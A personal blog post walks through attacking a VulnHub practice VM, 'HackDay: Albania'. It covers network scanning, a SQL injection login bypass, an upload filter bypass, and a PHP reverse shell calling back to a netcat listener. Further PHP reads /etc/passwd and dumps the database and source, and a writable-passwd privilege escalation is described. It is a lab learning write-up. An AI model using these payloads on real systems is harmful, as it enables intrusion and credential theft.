---
layout: post
title:  "First Stab at a Vulnhub VM"
date:   2017-2-8 19:20:00 -0400
categories: update post exploitation vulnhub penetration-test
---
<h1>Introduction</h1>
VulnHub is a website the hosts a growing series of virtual machines as challenges in learning penetration testing, and I pulled one of their recent VMs, HackDay: Albania, the night before I wrote this post. I managed to get remote code execution and a connect back shell before I hit the end of the night and got a hint on actually escalating privilege to root. The way I went about it is more relaxed than it should be in any penetration test, but I had a limited amount of time to really dig around in attacking it. Below is my write-up.

<h1>Scanning</h1>
I started up the VM under a Host-Only adapter who's ip-range came after 192.168.56.1. Netdiscover and me weren't getting along too well, so I just used nmap to get two things done at once. I scanned the range and noted the ports open on the host. 

{% highlight text %}
$ nmap -T5 192.168.56.1-255

Starting Nmap 7.01 ( https://nmap.org ) at 2017-02-07 23:17 EST
Nmap scan report for 192.168.56.1
...

Nmap scan report for 192.168.56.101
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8008/tcp open  http
{% endhighlight %}

I was pretty sure that was it, and was very doubtful that I'd have much to gain early on from trying ssh.

<h1>Attacking</h1>
I went to the http site right off, and was greeted with a hilarious background image of Rami Malek in Mr. Robot.

<img src="/pics/mr-robot-background.png">

Get it? The page had a modal window with a language I can't read, but I think translates to something like "if I were me, I'd know where to go," and with the hint of the background image I went right in to the robots.txt. There I saw several directories, but poking inside one at random I got some troll meme.

<img src="/pics/meme-lizard.jpg">

I decided to use Python then to open all of them, figuring the secret was probably within one of them.

{% highlight BASH %}
$ wget 192.168.56.101:8008/robots.txt
{% endhighlight %}
{% highlight Python %}
$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> f = file("robots.txt")
>>> lines = f.readlines()
>>> dirs = []
>>> for l in lines:
...   dirs.append(l[10:-1])
... 
>>> dirs
['/rkfpuzrahngvat/', '/slgqvasbiohwbu/', '/tmhrwbtcjpixcv/', '/vojtydvelrkzex/', '/wpkuzewfmslafy/', '/xqlvafxgntmbgz/', '/yrmwbgyhouncha/', '/zsnxchzipvodib/', '/atoydiajqwpejc/', '/bupzejbkrxqfkd/', '/cvqafkclsyrgle/', '/unisxcudkqjydw/', '/dwrbgldmtzshmf/', '/exschmenuating/', '/fytdinfovbujoh/', '/gzuejogpwcvkpi/', '/havfkphqxdwlqj/', '/ibwglqiryexmrk/', '/jcxhmrjszfynsl/', '/kdyinsktagzotm/', '/lezjotlubhapun/', '/mfakpumvcibqvo/', '/ngblqvnwdjcrwp/', '/ohcmrwoxekdsxq/', '/pidnsxpyfletyr/', '/qjeotyqzgmfuzs/']
>>> site = "192.168.56.101:8008"
>>> import subprocess
>>> for dir in dirs:
...   subprocess.call(["google-chrome", site+dir])
... 
{% endhighlight %}

LOTS of browser tabs flew open, and the one fruitful directory presented a hint that I should go deeper into /vulnbank/. This brought me to a login page that was vulnerable to SQL injection. I first gave a few tries akin to "' OR '1'='1'-- " in both of them, but something was off that caused it to fail. The error message at the very least though confirmed that this was a MySQL database, so I wouldn't have to learn much new if I were to make a connection to the MySQL database. I tried a few other combinations before seeing that "' OR *" for the username field worked just fine with the first string I tried in the password field.

<img src="/pics/vulnbank.png">

I lost my original screenshot of when I first saw the page, but here it is after I played with it for a while. 

Charles D. Hobson has an interesting name and lots of money, and the page presented for him had an odd section for "Open Tickets". The support box has a file upload entry form, which looks real attractive for exploiting. Without knowing what happened to these uploads yet, I uploaded an shell script for connecting back to a netcat listener. This created an open ticket for me, and there I spotted an img linked to "view_file.php?filename=shell.sh" in Chrome's Dev Tools. 

Cool. Heading directly there though, I got back

	Only images are allowed to get included. We hate hackers.

Alright...So I tried many a workaround for getting my upload properly included, from null byte poisoning, to file redirection, but what worked was something I found <a href="http://security.stackexchange.com/questions/45156/php-null-byte-include-failing-explation-seeked">here</a>. The simplest thing was of course the solution, and I just had to rename the file to end with ".jpg". Thanks a lot, wireghoul. I stole some PHP connect back code that looked like...

{% highlight PHP %}
<?php

$sock = fsockopen("192.168.56.1", 40); exec("/bin/bash -i <&3 >&3 2>&3");

?>
{% endhighlight %}

I turned off my firewall, opened a terminal with "nc -l 40" to listen for a connection on port 40, and opened the page again. What's pecular is my netcat listener received a connection right away, but the connection was closed as soon as it came. This drove me some kind of mad in confusion, but I was pretty sure I had command execution at the very least. Without a working shell, I decided to disclose as much as possible of what sounded interesting at the time. I was still wondering if there were creds for me to steal for a login to ssh. The PHP I used looked kinda like...

{% highlight PHP %}

<?php
	echo shell_exec("uname -a");
	echo "<br>passwd...<br>";
	echo shell_exec("cat /etc/passwd"); //hope for some passwords to crack
	echo "<br>";

	echo shell_exec("ls /home/"); //enumerate users better this time...
	echo "<br>";

	//dump DB?

	$query = "SELECT * FROM klienti";
	$res = execute_query($query);
	while($result = mysqli_fetch_assoc($res)){
				  var_dump($result);
				  echo "<br>";
	}
	
	echo shell_exec("cat /var/www/html/unisxcudkqjydw/vulnbank/client/*"); //dumping the source of everything in the directory

	//...and so forth
?>

{% endhighlight %}

I let all of the source spill out onto the page, and took notice of the passwd file, the database creds, the OS identification, and a great big meme.

<img src="/pics/suchhaxor.png" title="So meme.">

Within the passwd file, I noticed that there was one user <i>taviso</i> with an <i>x</i> where I wanted to find a password hash. So that secret was probably in the shadow instead, but apache didn't have the permissions to read that.

Within the database creds, I took down hobson:Charles123, and jeff:jeff321, but these didn't look promising for anything else because neither username was in the passwd file. I tried to SSH with them anyway, but that was a futile effort.

The OS identification made it feel like the kernel version was too new for Dirty Cow or any related exploit I could try to cobble together.

Eventually I did decide to go looking for what PHP reverse shell scripts other people were using, and I found <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" >this one from PentestMonkey</a> to be promising. Uploading it, running my netcat listener, and receiving the shell was surprisingly painless. 

<h1>Where I Ended</h1>
That's about as far as I got with the VM. I had a shell, but a particular note came with it.

	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	/bin/sh: 0: can't access tty; job control turned off

Without a tty, I apparently couldn't even try the <i>su</i> command, or a variety of others. taviso's home folder was barren of any binaries I could exploit or configuration files I could write to, and he had no .ssh directory. I listed back through again all of the content hosted on the web server, but it was all data I had taken note of already. It was 3AM and I was stuck on escalating my priviledges much further, and so I finally gave up and looked up a hint.

Surprisingly, the /etc/passwd file is writable by any user.

	$ ls -al /etc/passwd
	-rw-r--rw- 1 root root 1795 Feb  9 20:20 /etc/passwd 

With this, anyone could write their own user into the passwd file. After generating a password with <b>openssl passwd -1 -salt somesalt easypassword</b>, one would need only concatenate the file before changing into the user. My issue though?

	$ su
	su: must be run from a terminal

/dev/console can't be rm'd with the permissions of www-data, and neither Make, GCC, TCC, or Python is installed in the VM. There is Perl, but I couldn't figure out anything I could accomplish with Perl that the PHP shell script hadn't already tried. So this is about where I decided I was done. I don't have the flag, but I'm happy enough with the shell I got, unless someone out there would like to give me the low down on stealing tty devices, or escalating my priviledges without one. 

<h1>The Day After</h1>

<img src="/pics/wot.png">

...I guess my mistake was not running the VM in headless mode. 

